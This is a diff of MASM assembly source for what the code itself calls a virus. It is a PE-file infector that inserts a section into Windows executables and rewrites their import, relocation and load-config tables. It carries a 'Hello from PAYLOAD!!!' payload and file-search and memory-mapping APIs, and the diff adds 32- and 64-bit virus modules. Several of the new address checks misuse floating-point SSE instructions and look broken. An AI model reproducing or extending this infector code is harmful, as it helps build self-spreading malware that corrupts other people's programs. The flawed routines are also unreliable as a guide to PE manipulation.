@@ -9,7 +9,8 @@ CurrentCdeclNotation equ <fastcall>
 else 
 CurrentStdcallNotation equ <stdcall>
 CurrentCdeclNotation equ <c>
-.486
+.686
+.XMM
 endif 
 
 option casemap:none
@@ -733,7 +734,7 @@ HandleAllTables proc CurrentStdcallNotation uses cbx cdi cdx pe:cword, scRVA:dwo
             ;    invoke HandleRelocs, [pe], csi, [scRVA], [v_diff]
             .elseif [i] == IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG
                 ;invoke AlignToTop, [scSize], [fileAligment]
-                invoke HandleLoadConfTable, [pe], csi, [scRVA], [f_diff], [v_diff]
+                ;invoke HandleLoadConfTable, [pe], csi, [scRVA], [f_diff], [v_diff]
             .elseif [i] == IMAGE_DIRECTORY_ENTRY_RESOURCE
                 invoke HandleResourceTable, [pe], csi, [scRVA], [v_diff], [ind]
             .endif
@@ -863,11 +864,16 @@ HandleResourceTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pDirA
     ret
 HandleResourceTable endp
 
+; TODO возня с адресами
 HandleLoadConfTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pILCT:cword, scRVA:dword, scSize:dword, allignScSize:dword
 
     local pBase:cword
     local ib:cword
     local i:cword
+    local pCurrNtHead:cword
+    local is_x64:byte
+    local count:cword
+    local SehHandleTable:cword
    ; local pMem:cword
 
     ifdef _WIN64
@@ -878,17 +884,29 @@ HandleLoadConfTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pILCT
 	endif
 
     mov cdi, [pe]
-    mov ccx, [cdi].PeHeaders.nthead
-    lea ccx, [ccx].IMAGE_NT_HEADERS.OptionalHeader
-    mov ccx, [ccx].IMAGE_OPTIONAL_HEADER.ImageBase
+    .if byte ptr [cdi].PeHeaders.isPe64 == 1
+        mov ccx, [cdi].PeHeaders.nthead64
+        mov [is_x64], 1
+    .else
+        mov ccx, [cdi].PeHeaders.nthead
+        mov [is_x64], 0
+    .endif
+    mov [pCurrNtHead], ccx
+    ;mov ccx, [pCurrNtHead]
+    
     mov [ib], ccx
 
     mov cdi, [cdi].PeHeaders.mem
     mov [pBase], cdi
 
     mov cdi, [pILCT]
-    .if [cdi].IMAGE_LOAD_CONFIG_DIRECTORY_FULL.SEHandlerTable != 0
-        mov ccx, [cdi].IMAGE_LOAD_CONFIG_DIRECTORY_FULL.SEHandlerTable
+    .if byte ptr [is_x64] == 1
+        mov cax, [cdi].IMAGE_LOAD_CONFIG_DIRECTORY_FULL64.SEHandlerTable
+    .else
+
+    .endif
+    .if [cdi].IMAGE_LOAD_CONFIG_DIRECTORY_FULL64.SEHandlerTable != 0
+        mov ccx, [cdi].IMAGE_LOAD_CONFIG_DIRECTORY_FULL64.SEHandlerTable
         sub ccx, [ib]
         invoke RvaToOffset, ecx, [pe], NULL
         .if cax == 0
@@ -899,7 +917,7 @@ HandleLoadConfTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pILCT
         mov ecx, [allignScSize]
         xor ecx, ecx
         mov [i], ccx
-        .while ccx < [cdi].IMAGE_LOAD_CONFIG_DIRECTORY_FULL.SEHandlerCount
+        .while ccx < [cdi].IMAGE_LOAD_CONFIG_DIRECTORY_FULL64.SEHandlerCount
             mov ecx, [scSize]
             .if [cax] >= cdx
                 add [cax], ccx
@@ -916,12 +934,13 @@ HandleLoadConfTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pILCT
     ret
 HandleLoadConfTable endp
 
-; TODO Для первой секции прибавлять другое значение
+; TODO править сложение с ib
 HandleRelocs proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIRT:cword, scRVA:dword, allignScSize:dword
 
     local pBlocks:cword
     local pBase:cword
-    local ib:cword
+    local pIb:cword
+    local is_x64:byte
 
     ifdef _WIN64
 		mov [rbp + 10h], rcx
@@ -929,12 +948,18 @@ HandleRelocs proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIRT:cword, 
 		mov [rbp + 20h], r8
 		mov [rbp + 28h], r9
 	endif
-
+    
     mov csi, [pe]
-    mov ccx, [csi].PeHeaders.nthead
+    .if byte ptr [csi].PeHeaders.isPe64 == 1
+        mov ccx, [csi].PeHeaders.nthead64
+        mov byte ptr [is_x64], 1
+    .else
+        mov ccx, [csi].PeHeaders.nthead  
+        mov byte ptr [is_x64], 0
+    .endif
     lea ccx, [ccx].IMAGE_NT_HEADERS.OptionalHeader
-    mov ccx, cword ptr [ccx].IMAGE_OPTIONAL_HEADER.ImageBase
-    mov [ib], ccx
+    lea ccx, [ccx].IMAGE_OPTIONAL_HEADER.ImageBase
+    mov [pIb], ccx
 
     mov csi, [csi].PeHeaders.mem
     mov [pBase], csi
@@ -959,26 +984,54 @@ HandleRelocs proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIRT:cword, 
             mov ax, word ptr [ccx]
             and ax, 0fffh
             add csi, cax
-            mov edx, [scRVA] 
-            add cdx, [ib]
-            .if cword ptr [csi] >= cdx
-                xor cax, cax
+            mov edx, [scRVA]
+            DbgBreak
+            mov cdx, [pIb]
+            movss xmm1, dword ptr [scRVA]
+            movss xmm2, xmm1
+            .if byte ptr [is_x64] == 1
+                movsd xmm1, qword ptr [cdx]
+                addpd xmm1, xmm2
+                comisd xmm1, qword ptr [csi]
+            .else 
+                movss xmm1, dword ptr [cdx]
+                addpd xmm1, xmm2
+                comiss xmm1, dword ptr [csi]
+            .endif
+            jbe l1
+            jmp next1
+            ;.if cword ptr [csi] >= cdx
+            l1:
+                ;xor cax, cax
                 ;mov cdx, cax
                 
-                mov edx, dword ptr [cbx + scInfo.SizeOfTargetSec]
+                ;mov edx, dword ptr [cbx + scInfo.SizeOfTargetSec]
                 ;invoke AlignToTop, cdx, [pe]
-                add cdx, [ib]
-                mov ecx, [cbx + scInfo.targetSecRVA]
-                add cdx, ccx
-                .if cword ptr [csi] < cdx
+                ;add cdx, [pIb]
+                ;mov ecx, [cbx + scInfo.targetSecRVA]
+                movss xmm2, dword ptr [cbx + scInfo.SizeOfTargetSec]
+                addpd xmm1, xmm2
+                ;add cdx, ccx
+                .if byte ptr [is_x64] == 1
+                    comisd xmm1, qword ptr [csi]
+                .else
+                    comiss xmm1, dword ptr [csi]
+                .endif
+                jge l2
+                jmp l3
+                ; .if cword ptr [csi] < cdx
+                l2:
                     mov ecx, dword ptr [cbx + scInfo.f_diff]
                     mov cdx, ccx
-                .else
+                    jmp next2
+                ; .else
+                l3:
                     mov ecx, dword ptr [cbx + scInfo.v_diff]
                     mov cdx, ccx
-                .endif
+                ; .endif
+                next2:
                 add cword ptr [csi], cdx
-            .endif
+            ;.endif
             ; DbgBreak
             ; mov edx, dword ptr [cbx + scInfo.SizeOfTargetSec]
             ; add edx, [cbx + scInfo.targetSecRVA]
@@ -987,6 +1040,7 @@ HandleRelocs proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIRT:cword, 
             ;     and edx, 0fffh
             ;     add word ptr [ccx], dx
             ; .endif
+            next1:
             mov ccx, [pBlocks]
             add ccx, 2
         .endw
@@ -1060,6 +1114,8 @@ HandleImportTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIDT:cw
 
 	local currEntry:cword
     local iat:cword
+    local is_x64:byte
+    local ordFlag:qword
 
 	ifdef _WIN64
 		mov [rbp + 10h], rcx
@@ -1067,6 +1123,19 @@ HandleImportTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIDT:cw
 		mov [rbp + 20h], r8
 		mov [rbp + 28h], r9
 	endif
+
+    mov cdi, [pe]
+    mov al, byte ptr [cdi].PeHeaders.isPe64
+    mov [is_x64], al
+
+    .if byte ptr [is_x64] == 1
+        lea cax, [ordFlag]
+        mov dword ptr [cax], 0
+        mov dword ptr [cax + 4], 080000000h
+    .else
+        lea cax, [ordFlag]
+        mov dword ptr [cax], 080000000h
+    .endif
 
 	mov cax, [pIDT]
 	mov [currEntry], cax
@@ -1086,7 +1155,7 @@ HandleImportTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIDT:cw
             .endif
         .endif
 
-        ;DbgBreak
+        DbgBreak
         xor csi, csi
         .if [cdi].IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk != NULL
             mov esi, [cdi].IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk
@@ -1101,18 +1170,65 @@ HandleImportTable proc CurrentStdcallNotation uses cbx cdi csi pe:cword, pIDT:cw
         mov [iat], cax
     
         mov csi, [iat]
-        .while cword ptr [csi] != NULL
-            xor cdx, cdx
-            mov edx, [scRVA]
-            mov ccx, IMAGE_ORDINAL_FLAG
-            .if !(cword ptr [csi] & ccx) && \
-                (cword ptr [csi] >= cdx)
+        mov edx, [scSize]
+        ;.while cword ptr [csi] != NULL
+        @@:
+            xorpd xmm2, xmm2
+            xorpd xmm3, xmm3
+            xorpd xmm1, xmm1
+            lea ccx, [ordFlag]
+            .if byte ptr [is_x64] == 1
+                comisd xmm1, qword ptr [csi]
+                jz @f
+                ;movlpd xmm2, qword ptr [ccx]  
 
-                mov edx, [scSize]
+            ; mov ccx, oridnal_flag
+            ; .if !(cword ptr [csi] & ccx) && \
+            ;     (cword ptr [csi] >= cdx)
+                mov ecx, dword ptr [csi+4]
+                ;comisd xmm2, qword ptr [csi]
+                and ecx, 080000000h
+                jnz iter1_n
+                movd xmm1, dword ptr [scRVA]
+                comisd xmm1, qword ptr [csi]
+                jnb iter1_n
                 add dword ptr [csi], edx
+            ;.endif
+                iter1_n:
+                add csi, sizeof(qword)
+                jmp @b
+            .else
+                comiss xmm1, dword ptr [csi]
+                jz @f
+                ;movd xmm2, dword ptr [ccx]
+                mov ecx, dword ptr [csi]
+                ;comisd xmm2, qword ptr [csi]
+                and ecx, 080000000h
+                ;comiss xmm2, dword ptr [csi]
+                jnz iter1_n
+                movd xmm1, dword ptr [scRVA]
+                comiss xmm1, dword ptr [csi]
+                jnb iter2_n
+                add dword ptr [csi], edx
+
+                iter2_n:
+                add csi, sizeof(dword)
+                jmp @b
             .endif
-            add csi, sizeof(cword)
-        .endw
+            ; xor cdx, cdx
+            ; mov edx, [scRVA]
+            
+            
+            ; .if !(cword ptr [csi] & ccx) && \
+            ;     (cword ptr [csi] >= cdx)
+
+            ;     mov edx, [scSize]
+            ;     add dword ptr [csi], edx
+            ; .endif
+            ; add csi, sizeof(cword)
+            ; jmp @b
+        @@:
+        ;.endw
 
         mov eax, [cdi].IMAGE_IMPORT_DESCRIPTOR.OriginalFirstThunk
         .if eax != NULL && eax >= [scRVA]
@@ -1312,6 +1428,15 @@ msgPayload:
 db "Hello from PAYLOAD!!!", 10, 0
 
 DefineFuncNamesAndPointers VirtualProtect, MessageBoxA, GetModuleHandleA, WriteProcessMemory, FindFirstFileA, FindNextFileA, FindClose, GetSystemDirectoryA, CreateFileA, GetFileSize, CreateFileMappingA, CloseHandle,  MapViewOfFile, UnmapViewOfFile, GetLastError, GetTickCount, Sleep, printf, memset, strlen, memcpy, malloc, strcmp, sprintf, strcpy, strcat, memmove,
+
+endCurrArch:
+startAnotherArch:
+
+ifdef _WIN64
+include virus32.asm
+else
+include virus64.asm
+endif
 
 totalEnd:
 
